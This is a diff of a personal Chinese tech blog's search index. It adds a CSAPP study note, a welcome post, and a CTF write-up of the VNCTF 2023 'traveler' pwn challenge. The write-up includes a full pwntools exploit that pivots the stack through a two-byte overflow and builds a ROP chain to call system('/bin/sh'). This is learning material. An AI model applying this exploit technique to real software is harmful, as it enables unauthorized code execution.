@@ -1,45 +1,73 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-  
-    
-    <entry>
-      <title>Hello world</title>
-      <link href="/2023/05/07/hello-world/"/>
-      <url>/2023/05/07/hello-world/</url>
-      
-        <content type="html"><![CDATA[<table><tr><td bgcolor=#f7ff05><font size = 10 face ="黑体" color = "red">破壳第一天</font></td></tr></table><p>欢迎来到<font size =4 color = "orange">KJ</font>的博客世界，我将会在这里更新有关于计算机的知识以及日常的生活，欢迎大家来看我的blog。</p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>CSAPP Lesson 1</title>
-      <link href="/2023/05/07/CSAPP-Lesson-1/"/>
-      <url>/2023/05/07/CSAPP-Lesson-1/</url>
-      
-        <content type="html"><![CDATA[<h1 id="Gist-of-Lesson-1"><a href="#Gist-of-Lesson-1" class="headerlink" title="Gist of Lesson 1"></a><strong>Gist of Lesson 1</strong></h1><hr><p><em>摘要：这是笔者正式学习CMU的CSAPP教程的过程总结，是属于<font color = #ffa500 face ="楷体" size = 5>边学边看</font>的方式进行写作。看看学完之后的自己和学之前的自己再操作系统上的理解有什么改变和提高，同时记录下初学者在进行学习时最开始的感受，以初学者的视角，记录下这门课程的真是学习经历</em></p><h2 id="Lesson-1"><a href="#Lesson-1" class="headerlink" title="Lesson 1"></a>Lesson 1</h2><p>今天看CSAPP的第一课，虽然中间的大部分时间是讲学术诚信，对于我个上网课的没什么启发，但其中教授抛出的一个问题还是很适合我的思考，这里写下来，希望在学成之后对这个问题能有更好的理解。</p><ol><li>问题：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    <span class="type">void</span> <span class="title function_">copyij</span><span class="params">(<span class="type">int</span> src[<span class="number">2048</span>][<span class="number">2048</span>]</span></span><br><span class="line"><span class="params">                <span class="type">int</span> dst[<span class="number">2048</span>][<span class="number">2048</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span> ; i&lt; <span class="number">2048</span> ; i++)</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span> ; j &lt; <span class="number">2048</span> ; j++)</span><br><span class="line">            src[i][j]=dst[i][j];</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    <span class="type">void</span> <span class="title function_">copyij</span><span class="params">(<span class="type">int</span> src[<span class="number">2048</span>][<span class="number">2048</span>]</span></span><br><span class="line"><span class="params">                <span class="type">int</span> dst[<span class="number">2048</span>][<span class="number">2048</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span> ; j&lt; <span class="number">2048</span> ; j++)</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">2048</span> ; i++)</span><br><span class="line">            src[i][j]=dst[i][j];</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><ol start="2"><li>分析：</li></ol><p>对于这两个小函数，看似在实现的逻辑上是一致的：都是把dst[i][j]值赋值给src[i][j]的值，但是在具体的代码实现上。却是相差了20倍!</p><img src="https://s2.loli.net/2023/05/10/sBdKATDCnHaQIxl.png" alt="Lesson 1 question.png"><p><a href="https://www.bilibili.com/video/BV1iW411d7hd/?spm_id_from=333.337.search-card.all.click"><em><font size=1>图片来自B站UP主 刘迪望 的转载视频</font></em></a></p><hr><img src="https://s2.loli.net/2023/05/10/Ql5vHAE4mKo9cqw.png" alt="Lesson 1 explanation.png"><p><a href="https://www.bilibili.com/video/BV1iW411d7hd/?spm_id_from=333.337.search-card.all.click"><em><font size=1>图片来自B站UP主 刘迪望 的转载视频</font></em></a></p><hr><ol start="3"><li>总结及个人猜想：</li></ol><p><font size = 2>总结：Lesson 1是开课的第一节，大概地讲授了课程的重要性以及课程的大概安排，其中的这个问题让我产生了思考，但因为写下这些的时候，笔者仅仅是刚开始的小白，而这也只是一个现在自己的猜测，同时也是写给未来的自己看的。所以在语言以及思考上都是有不足的。</p><p><font face="楷体"><del>个人的猜想：笔者个人认为之所以产生这样的差距是因为二维数组在储存方式上的特点所导致的:二维数组的储存是先固定第一位再排序第二位（即先固定array[i][j]中的i，然后再进行j的输入）。</del></font></font></p><img src="https://s2.loli.net/2023/05/10/OUK7bZvfzFwgB9l.png" alt="Answer about array"><p><font face ="隶书" size = 1>这个是来自我的猜想，看看学成归来会有什么新的体会以及修正</font></p>]]></content>
-      
-      
+<search>
+  <entry>
+    <title>2023VNCTF-traveler</title>
+    <url>/2023/05/12/2023VNCTF-traveler/</url>
+    <content><![CDATA[<h1 id="2023VNCTF-traveler"><a href="#2023VNCTF-traveler" class="headerlink" title="2023VNCTF-traveler"></a><font size = 10 color = 'orange'>2023VNCTF-traveler</font></h1><h2 id="1-题目分析"><a href="#1-题目分析" class="headerlink" title="1.题目分析"></a>1.题目分析</h2><p>首先老传统手艺：checksec一下：<br><img src=https://s2.loli.net/2023/05/12/N1jST5JCWyY793b.png><br>好家伙，就一个栈不可执行，<del>感觉应该不是很难</del>直接拖进IDA逆向看看</p>
+<p>逆向文件：<br><img src =https://s2.loli.net/2023/05/12/wiySZc1LbF5GVme.png><br>可以看到有明显的栈溢出点： <code>buf[32]</code>和<code>read(0,&amp;buf,48ull)</code><br>一看刚好溢出两个字节，再看程序，哇塞有个后门函数<img src = https://s2.loli.net/2023/05/12/rlmnwUByu5qLYeG.png><br>直接ret2text（只能说我是真单纯）。后面发现怎么样也打不通，再仔细一看，哇塞！原来是<font size =4><code>echo flag</code></font>（只能说离了个大谱）</p>
+<p>看来果然没那么简单，要不然我说为什么还多给了个<code>msg</code> ？看来只能另辟蹊径了。后来仔细分析了下，程序就只给了两字节的溢出值，根本就没办法制造什么ROP链，欸，等等，溢出<font size = 4 color = red face = '楷体'>两字节</font>这不刚好可以覆盖prev_rbp和ret_addr这两个地址值，所以这道应该是栈迁移。</p>
+<h2 id="2-exp构造"><a href="#2-exp构造" class="headerlink" title="2.exp构造"></a>2.exp构造</h2><p>先给出exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./traveler&quot;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./traveler&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">fake_stack = <span class="number">0x404d00</span></span><br><span class="line">read = <span class="number">0x401216</span> </span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p_rdi = <span class="number">0x4012c3</span></span><br><span class="line">leave = <span class="number">0x401253</span></span><br><span class="line">bss = <span class="number">0x4040a0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pid&quot;</span>+<span class="built_in">str</span>(proc.pidof(io)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;u?\n&quot;</span>)</span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+p64(fake_stack+<span class="number">0x20</span>)+p64(read)</span><br><span class="line">io.send(p1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;fe?\n&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p3 = p64(p_rdi) + p64(bss) + p64(sys_addr) + p64(<span class="number">0</span>) + p64(fake_stack-<span class="number">0x08</span>) + p64(leave)</span><br><span class="line">io.send(p3)</span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;fe?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<img src = https://s2.loli.net/2023/05/12/H5tJf8gQrAwkN2m.png>
+先构造一个`fake_stack`（也就是我们栈迁移处），然后再控制我们的rip（0x401216）回到我们的程序流。这时候我们就开辟了一个fake_stack空间。然后这时，我们就可以向这个fake_stack上构造我们的rop链了。
+
+<h2 id="3-getshell"><a href="#3-getshell" class="headerlink" title="3.getshell"></a>3.getshell</h2><img src = https://s2.loli.net/2023/05/12/Cp9XLYcZFkdbPVu.png>
+
+<p>这道题来自VNCTF，最后附上题目作者的出题手记：<a href="https://kotoriseed.github.io/post/vnctf2023-pwn/#exp">https://kotoriseed.github.io/post/vnctf2023-pwn/#exp</a><br>看到作者提到了ogg法，我甚是好奇，等我学会了再回来进行更新。</p>
+]]></content>
       <categories>
-          
-          <category> CSAPP </category>
-          
+        <category>-pwn学习</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> CSAPP </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-  
-  
+      <tags>
+        <tag>-pwn -wp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CSAPP Lesson 1</title>
+    <url>/2023/05/07/CSAPP-Lesson-1/</url>
+    <content><![CDATA[<h1 id="Gist-of-Lesson-1"><a href="#Gist-of-Lesson-1" class="headerlink" title="Gist of Lesson 1"></a><strong>Gist of Lesson 1</strong></h1><hr>
+<p><em>摘要：这是笔者正式学习CMU的CSAPP教程的过程总结，是属于<font color = #ffa500 face ="楷体" size = 5>边学边看</font>的方式进行写作。看看学完之后的自己和学之前的自己再操作系统上的理解有什么改变和提高，同时记录下初学者在进行学习时最开始的感受，以初学者的视角，记录下这门课程的真是学习经历</em></p>
+<h2 id="Lesson-1"><a href="#Lesson-1" class="headerlink" title="Lesson 1"></a>Lesson 1</h2><p>今天看CSAPP的第一课，虽然中间的大部分时间是讲学术诚信，对于我个上网课的没什么启发，但其中教授抛出的一个问题还是很适合我的思考，这里写下来，希望在学成之后对这个问题能有更好的理解。</p>
+<ol>
+<li>问题：</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="type">void</span> <span class="title function_">copyij</span><span class="params">(<span class="type">int</span> src[<span class="number">2048</span>][<span class="number">2048</span>]</span></span><br><span class="line"><span class="params">                <span class="type">int</span> dst[<span class="number">2048</span>][<span class="number">2048</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span> ; i&lt; <span class="number">2048</span> ; i++)</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span> ; j &lt; <span class="number">2048</span> ; j++)</span><br><span class="line">            src[i][j]=dst[i][j];</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="type">void</span> <span class="title function_">copyij</span><span class="params">(<span class="type">int</span> src[<span class="number">2048</span>][<span class="number">2048</span>]</span></span><br><span class="line"><span class="params">                <span class="type">int</span> dst[<span class="number">2048</span>][<span class="number">2048</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span> ; j&lt; <span class="number">2048</span> ; j++)</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">2048</span> ; i++)</span><br><span class="line">            src[i][j]=dst[i][j];</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>分析：</li>
+</ol>
+<p>对于这两个小函数，看似在实现的逻辑上是一致的：都是把dst[i][j]值赋值给src[i][j]的值，但是在具体的代码实现上。却是相差了20倍!</p>
+<img src="https://s2.loli.net/2023/05/10/sBdKATDCnHaQIxl.png" alt="Lesson 1 question.png">
+
+<p><a href="https://www.bilibili.com/video/BV1iW411d7hd/?spm_id_from=333.337.search-card.all.click"><em><font size=1>图片来自B站UP主 刘迪望 的转载视频</font></em></a></p>
+<hr>
+<img src="https://s2.loli.net/2023/05/10/Ql5vHAE4mKo9cqw.png" alt="Lesson 1 explanation.png">
+
+<p><a href="https://www.bilibili.com/video/BV1iW411d7hd/?spm_id_from=333.337.search-card.all.click"><em><font size=1>图片来自B站UP主 刘迪望 的转载视频</font></em></a></p>
+<hr>
+<ol start="3">
+<li>总结及个人猜想：</li>
+</ol>
+<p><font size = 2>总结：Lesson 1是开课的第一节，大概地讲授了课程的重要性以及课程的大概安排，其中的这个问题让我产生了思考，但因为写下这些的时候，笔者仅仅是刚开始的小白，而这也只是一个现在自己的猜测，同时也是写给未来的自己看的。所以在语言以及思考上都是有不足的。</p>
+<p><font face="楷体"><del>个人的猜想：笔者个人认为之所以产生这样的差距是因为二维数组在储存方式上的特点所导致的:二维数组的储存是先固定第一位再排序第二位（即先固定array[i][j]中的i，然后再进行j的输入）。</del></font></font></p>
+<img src="https://s2.loli.net/2023/05/10/OUK7bZvfzFwgB9l.png" alt="Answer about array">
+
+<p><font face ="隶书" size = 1>这个是来自我的猜想，看看学成归来会有什么新的体会以及修正</font></p>
+]]></content>
+      <categories>
+        <category>CSAPP</category>
+      </categories>
+      <tags>
+        <tag>CSAPP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello world</title>
+    <url>/2023/05/07/hello-world/</url>
+    <content><![CDATA[<table><tr><td bgcolor=#f7ff05><font size = 10 face ="黑体" color = "red">破壳第一天</font></td></tr></table>
+
+<p>欢迎来到<font size =4 color = "orange">KJ</font>的博客世界，我将会在这里更新有关于计算机的知识以及日常的生活，欢迎大家来看我的blog。</p>
+<h1 id="特别鸣谢："><a href="#特别鸣谢：" class="headerlink" title="特别鸣谢："></a><font size = 5 face = 楷体 color = red >特别鸣谢：</font></h1><p>标志设计来自：sea blue blue<br><img src = https://s2.loli.net/2023/05/09/qMPQ4ScXBnsJZoH.png></p>
+]]></content>
+  </entry>
 </search>
